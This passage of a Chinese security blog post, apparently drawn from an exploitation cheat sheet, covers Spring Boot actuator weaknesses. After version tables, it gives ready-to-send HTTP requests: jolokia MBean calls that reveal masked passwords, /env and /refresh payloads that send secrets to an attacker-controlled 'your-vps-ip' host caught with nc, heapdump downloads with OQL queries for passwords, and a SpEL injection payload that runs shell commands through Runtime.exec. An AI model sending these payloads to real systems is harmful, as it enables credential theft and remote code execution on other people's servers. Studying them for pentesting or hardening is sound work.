+</tr>
+</tbody></table>
+<h4 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系："><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系：" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系："></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系：</h4><table>
+<thead>
+<tr>
+<th>Spring Cloud 大版本</th>
+<th>Spring Boot 版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Angel</td>
+<td>兼容 Spring Boot 1.2.x</td>
+</tr>
+<tr>
+<td>Brixton</td>
+<td>兼容 Spring Boot 1.3.x、1.4.x</td>
+</tr>
+<tr>
+<td>Camden</td>
+<td>兼容 Spring Boot 1.4.x、1.5.x</td>
+</tr>
+<tr>
+<td>Dalston</td>
+<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td>Edgware</td>
+<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td>Finchley</td>
+<td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
+</tr>
+<tr>
+<td>Greenwich</td>
+<td>兼容 Spring Boot 2.1.x</td>
+</tr>
+<tr>
+<td>Hoxton</td>
+<td>兼容 Spring Boot 2.2.x</td>
+</tr>
+</tbody></table>
+<h4 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义:"></a>Spring Cloud 小版本号的后缀及含义:</h4><table>
+<thead>
+<tr>
+<th>小版本号后缀</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>BUILD-SNAPSHOT</td>
+<td>快照版，代码不是固定，处于变化之中</td>
+</tr>
+<tr>
+<td>MX</td>
+<td>里程碑版</td>
+</tr>
+<tr>
+<td>RCX</td>
+<td>候选发布版</td>
+</tr>
+<tr>
+<td>RELEASE</td>
+<td>正式发布版</td>
+</tr>
+<tr>
+<td>SRX</td>
+<td>(修复错误和 bug 并再次发布的)正式发布版</td>
+</tr>
+</tbody></table>
+<h2 id="一：信息泄露"><a href="#一：信息泄露" class="headerlink" title="一：信息泄露"></a>一：信息泄露</h2><h3 id="0x01：路由地址及接口调用详情泄漏"><a href="#0x01：路由地址及接口调用详情泄漏" class="headerlink" title="0x01：路由地址及接口调用详情泄漏"></a>0x01：路由地址及接口调用详情泄漏</h3><blockquote>
+<p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p>
+</blockquote>
+<p>直接访问以下两个 swagger 相关路由，验证漏洞是否存在：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;v2&#x2F;api-docs</span><br><span class="line">&#x2F;swagger-ui.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;swagger</span><br><span class="line">&#x2F;api-docs</span><br><span class="line">&#x2F;api.html</span><br><span class="line">&#x2F;swagger-ui</span><br><span class="line">&#x2F;swagger&#x2F;codes</span><br><span class="line">&#x2F;api&#x2F;index.html</span><br><span class="line">&#x2F;api&#x2F;v2&#x2F;api-docs</span><br><span class="line">&#x2F;v2&#x2F;swagger.json</span><br><span class="line">&#x2F;swagger-ui&#x2F;html</span><br><span class="line">&#x2F;distv2&#x2F;index.html</span><br><span class="line">&#x2F;swagger&#x2F;index.html</span><br><span class="line">&#x2F;sw&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;api&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;static&#x2F;swagger.json</span><br><span class="line">&#x2F;user&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger-ui&#x2F;index.html</span><br><span class="line">&#x2F;swagger-dubbo&#x2F;api-docs</span><br><span class="line">&#x2F;template&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;static&#x2F;index.html</span><br><span class="line">&#x2F;dubbo-provider&#x2F;distv2&#x2F;index.html</span><br><span class="line">&#x2F;spring-security-rest&#x2F;api&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;spring-security-oauth-resource&#x2F;swagger-ui.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;mappings</span><br><span class="line">&#x2F;metrics</span><br><span class="line">&#x2F;beans</span><br><span class="line">&#x2F;configprops</span><br><span class="line">&#x2F;actuator&#x2F;metrics</span><br><span class="line">&#x2F;actuator&#x2F;mappings</span><br><span class="line">&#x2F;actuator&#x2F;beans</span><br><span class="line">&#x2F;actuator&#x2F;configprops</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p>
+<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>
+<h3 id="0x02：配置不当而暴露的路由"><a href="#0x02：配置不当而暴露的路由" class="headerlink" title="0x02：配置不当而暴露的路由"></a>0x02：配置不当而暴露的路由</h3><blockquote>
+<p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
+</blockquote>
+<p>参考 <a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">production-ready-endpoints</a> 和 <a href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;actuator</span><br><span class="line">&#x2F;auditevents</span><br><span class="line">&#x2F;autoconfig</span><br><span class="line">&#x2F;beans</span><br><span class="line">&#x2F;caches</span><br><span class="line">&#x2F;conditions</span><br><span class="line">&#x2F;configprops</span><br><span class="line">&#x2F;docs</span><br><span class="line">&#x2F;dump</span><br><span class="line">&#x2F;env</span><br><span class="line">&#x2F;flyway</span><br><span class="line">&#x2F;health</span><br><span class="line">&#x2F;heapdump</span><br><span class="line">&#x2F;httptrace</span><br><span class="line">&#x2F;info</span><br><span class="line">&#x2F;intergrationgraph</span><br><span class="line">&#x2F;jolokia</span><br><span class="line">&#x2F;logfile</span><br><span class="line">&#x2F;loggers</span><br><span class="line">&#x2F;liquibase</span><br><span class="line">&#x2F;metrics</span><br><span class="line">&#x2F;mappings</span><br><span class="line">&#x2F;prometheus</span><br><span class="line">&#x2F;refresh</span><br><span class="line">&#x2F;scheduledtasks</span><br><span class="line">&#x2F;sessions</span><br><span class="line">&#x2F;shutdown</span><br><span class="line">&#x2F;trace</span><br><span class="line">&#x2F;threaddump</span><br><span class="line">&#x2F;actuator&#x2F;auditevents</span><br><span class="line">&#x2F;actuator&#x2F;beans</span><br><span class="line">&#x2F;actuator&#x2F;health</span><br><span class="line">&#x2F;actuator&#x2F;conditions</span><br><span class="line">&#x2F;actuator&#x2F;configprops</span><br><span class="line">&#x2F;actuator&#x2F;env</span><br><span class="line">&#x2F;actuator&#x2F;info</span><br><span class="line">&#x2F;actuator&#x2F;loggers</span><br><span class="line">&#x2F;actuator&#x2F;heapdump</span><br><span class="line">&#x2F;actuator&#x2F;threaddump</span><br><span class="line">&#x2F;actuator&#x2F;metrics</span><br><span class="line">&#x2F;actuator&#x2F;scheduledtasks</span><br><span class="line">&#x2F;actuator&#x2F;httptrace</span><br><span class="line">&#x2F;actuator&#x2F;mappings</span><br><span class="line">&#x2F;actuator&#x2F;jolokia</span><br><span class="line">&#x2F;actuator&#x2F;hystrix.stream</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其中对寻找漏洞比较重要接口的有：</p>
+<ul>
+<li><p><code>/env</code>、<code>/actuator/env</code></p>
+<p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p>
+<p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
+</li>
+<li><p><code>/refresh</code>、<code>/actuator/refresh</code></p>
+<p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p>
+</li>
+<li><p><code>/restart</code>、<code>/actuator/restart</code></p>
+<p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p>
+</li>
+<li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p>
+<p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
+</li>
+<li><p><code>/trace</code>、<code>/actuator/httptrace</code></p>
+<p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
+</li>
+</ul>
+<h3 id="0x03：获取被星号脱敏的密码的明文-方法一"><a href="#0x03：获取被星号脱敏的密码的明文-方法一" class="headerlink" title="0x03：获取被星号脱敏的密码的明文 (方法一)"></a>0x03：获取被星号脱敏的密码的明文 (方法一)</h3><blockquote>
+<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
+<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li>
+</ul>
+<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名"><a href="#步骤一：-找到想要获取的属性名" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-jolokia-调用相关-Mbean-获取明文"><a href="#步骤二：-jolokia-调用相关-Mbean-获取明文" class="headerlink" title="步骤二： jolokia 调用相关 Mbean 获取明文"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h5><p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p>
+<ul>
+<li>调用 <code>org.springframework.boot</code> Mbean</li>
+</ul>
+<blockquote>
+<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
+</blockquote>
+<p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li>
+</ul>
+<blockquote>
+<p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
+</blockquote>
+<p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>调用其他 Mbean</li>
+</ul>
+<blockquote>
+<p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p>
+</blockquote>
+<h3 id="0x04：获取被星号脱敏的密码的明文-方法二"><a href="#0x04：获取被星号脱敏的密码的明文-方法二" class="headerlink" title="0x04：获取被星号脱敏的密码的明文 (方法二)"></a>0x04：获取被星号脱敏的密码的明文 (方法二)</h3><h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可以 GET 请求目标网站的 <code>/env</code> </li>
+<li>可以 POST 请求目标网站的 <code>/env</code> </li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-1"><a href="#步骤一：-找到想要获取的属性名-1" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-使用-nc-监听-HTTP-请求"><a href="#步骤二：-使用-nc-监听-HTTP-请求" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code>  中的  <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p>
+<p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>
+<p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;value:$&#123;security.user.password&#125;@your-vps-ip</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤四：-刷新配置"><a href="#步骤四：-刷新配置" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤五：-解码属性值"><a href="#步骤五：-解码属性值" class="headerlink" title="步骤五： 解码属性值"></a>步骤五： 解码属性值</h5><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure>
+
+<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
+<h3 id="0x05：获取被星号脱敏的密码的明文-方法三"><a href="#0x05：获取被星号脱敏的密码的明文-方法三" class="headerlink" title="0x05：获取被星号脱敏的密码的明文 (方法三)"></a>0x05：获取被星号脱敏的密码的明文 (方法三)</h3><h4 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><blockquote>
+<p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p>
+</blockquote>
+<h5 id="步骤一：-找到想要获取的属性名-2"><a href="#步骤一：-找到想要获取的属性名-2" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-使用-nc-监听-HTTP-请求-1"><a href="#步骤二：-使用-nc-监听-HTTP-请求-1" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤三：-触发对外-http-请求"><a href="#步骤三：-触发对外-http-请求" class="headerlink" title="步骤三： 触发对外 http 请求"></a>步骤三： 触发对外 http 请求</h5><ul>
+<li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li>
+</ul>
+<p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;?&#x3D;$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;?&#x3D;$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li>
+</ul>
+<p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="步骤四：-刷新配置-1"><a href="#步骤四：-刷新配置-1" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06：获取被星号脱敏的密码的明文-方法四"><a href="#0x06：获取被星号脱敏的密码的明文-方法四" class="headerlink" title="0x06：获取被星号脱敏的密码的明文 (方法四)"></a>0x06：获取被星号脱敏的密码的明文 (方法四)</h3><blockquote>
+<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+<h4 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li>
+</ul>
+<h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-3"><a href="#步骤一：-找到想要获取的属性名-3" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-下载-jvm-heap-信息"><a href="#步骤二：-下载-jvm-heap-信息" class="headerlink" title="步骤二： 下载 jvm heap 信息"></a>步骤二： 下载 jvm heap 信息</h5><blockquote>
+<p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
+</blockquote>
+<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>
+<h5 id="步骤三：-使用-MAT-获得-jvm-heap-中的密码明文"><a href="#步骤三：-使用-MAT-获得-jvm-heap-中的密码明文" class="headerlink" title="步骤三： 使用 MAT 获得 jvm heap 中的密码明文"></a>步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5><p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p>
+<h2 id="二：远程代码执行"><a href="#二：远程代码执行" class="headerlink" title="二：远程代码执行"></a>二：远程代码执行</h2><blockquote>
+<p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p>
+</blockquote>
+<h3 id="0x01：whitelabel-error-page-SpEL-RCE"><a href="#0x01：whitelabel-error-page-SpEL-RCE" class="headerlink" title="0x01：whitelabel error page SpEL RCE"></a>0x01：whitelabel error page SpEL RCE</h3><h4 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
+<li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
+</ul>
+<h4 id="利用方法：-4"><a href="#利用方法：-4" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：找到一个正常传参处"><a href="#步骤一：找到一个正常传参处" class="headerlink" title="步骤一：找到一个正常传参处"></a>步骤一：找到一个正常传参处</h5><p>比如发现访问  <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p>
+<h5 id="步骤二：执行-SpEL-表达式"><a href="#步骤二：执行-SpEL-表达式" class="headerlink" title="步骤二：执行 SpEL 表达式"></a>步骤二：执行 SpEL 表达式</h5><p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>
+<p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += hex(ord(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line">print(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>open -a Calculator</code> 命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
+<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
+<li>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
+</ol>
+<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>
+<h4 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">repository/springboot-spel-rce</a></p>
+<p>正常访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9091&#x2F;article?id&#x3D;66</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>open -a Calculator</code> 命令：</p>
